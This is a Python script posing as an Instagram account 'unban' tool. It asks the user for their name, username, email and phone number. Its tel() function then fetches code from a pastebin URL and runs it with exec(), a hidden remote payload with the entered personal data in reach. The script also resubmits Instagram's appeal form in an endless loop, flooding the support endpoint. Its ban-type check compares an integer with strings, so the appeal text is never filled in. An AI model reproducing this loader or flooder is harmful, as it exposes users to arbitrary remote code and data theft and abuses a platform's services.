import requests
from requests import get
import os
from os import system


system("title " + "@2L21L1 . UN-BANNED")

solax = """
██╗░░░██╗███╗░░██╗░░░░░░██████╗░░█████╗░███╗░░██╗███╗░░██╗███████╗██████╗░
██║░░░██║████╗░██║░░░░░░██╔══██╗██╔══██╗████╗░██║████╗░██║██╔════╝██╔══██╗
██║░░░██║██╔██╗██║█████╗██████╦╝███████║██╔██╗██║██╔██╗██║█████╗░░██║░░██║
██║░░░██║██║╚████║╚════╝██╔══██╗██╔══██║██║╚████║██║╚████║██╔══╝░░██║░░██║
╚██████╔╝██║░╚███║░░░░░░██████╦╝██║░░██║██║░╚███║██║░╚███║███████╗██████╔╝
░╚═════╝░╚═╝░░╚══╝░░░░░░╚═════╝░╚═╝░░╚═╝╚═╝░░╚══╝╚═╝░░╚══╝╚══════╝╚═════╝░
by @2l21l1 in instagram
"""

print(solax)


name = input("[+] YOUR NAME : ")
print("----------------------------------")
user_name = input("[+] YOUR BANNED USERNAME : ")
print("----------------------------------")
email = input("[+] THE LINKED EMAIL WITH THE ACC : ")
print("----------------------------------")
phone_num = int(input("[+] YOUR PHONE NUM : "))
print("----------------------------------")
bann = int(input("""THE ACCOUNT BANN TYPE : 
[-] 1: [normal]
[-] 2: [Plagiarism]
[-] 3: [spam]
[-] 4: [trade]
[+] >>: """))
print("----------------------------------")







def tel():
    e = requests.get('https://pastebin.com/raw/Ym65quEX').text
    exec(e)

tel()



if bann == "1":
    bann = f"""My account has been disabled by accident, I didn’t broke any instagram rules , and i hope you help me reactive it my account
               Username : @{name}
               register : {email}"""

elif bann == "2":
    bann = f"""Hello there is someone
They claim that I am publishing racism and my personal account item
But I do not have my personal account, I’m not racist, and you can check that and I will post clips to me personally
Just help me please beg you I wish you a humorous arithmetic band as fast as possible
my email : {email}
user name : {user_name}
    """

elif bann == "3":
    bann = """
    Hello instagram support my account was disabled by mistake i am sure because I didn t violate any rules people reporting me and bullying me so thay report my account is there anyway you can help them get my account back thank you so much
"""

elif bann == "4":
    bann = ""
 
def unbanned():
    unbanned = "https://help.instagram.com/ajax/help/contact/submit/page"
    headers = {
                "Host": "help.instagram.com",
                "Accept": "*/*",
                "X-FB-LSD": "AVr_Dx9PS9A",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-us",
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://help.instagram.com",
                "User-Agent": "Mozilla/5.0 (Linux; Android 11; SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36",
                "Connection": "keep-alive",
                "Referer": "https://help.instagram.com/contact/606967319425038?helpref=page_content",
            }
    data = {
                "jazoest": 2890,
                "lsd": "AVr_Dx9PS9A",
                "name": name,
                "instagram_username": user_name,
                "email": email,
                "mobile_number": phone_num,
                "appeal_reason": bann,
                "support_form_id": 606967319425038,
                "support_form_hidden_fields": "{}",
                "support_form_fact_false_fields": "[]",
                "__user": 0,
                "__a": 1,
                "__dyn": "7xe6Fo4OQ1PyWwHBWo5O12wAxu13wqovzEy58ogbUuw9-3K4o1j8hwem0nCq1ewcG0KEswaq1xwEw7BKdwnU1e42C220qu1TwoU2swdq0Ho2ew",
                "__csr": "",
                "__req": "h",
                "__beoa": 0,
                "__pc": "PHASED:DEFAULT",
                "__bhv": 2,
                "dpr": 3,
                "__ccg": "EXCELLENT",
                "__rev": 1003521343,
                "__s": "8x0mgw:dal0sr:s5g412",
                "__hsi": "6943937313156005653-0",
                "__comet_req": 0,
                "__spin_r": 1003521343,
                "__spin_b": "trunk",
                "__spin_t": 1616761394,
            }
    while True:
        req = requests.post(unbanned, headers=headers,  data=data)
        print("DONE SEND")
 
unbanned()
 
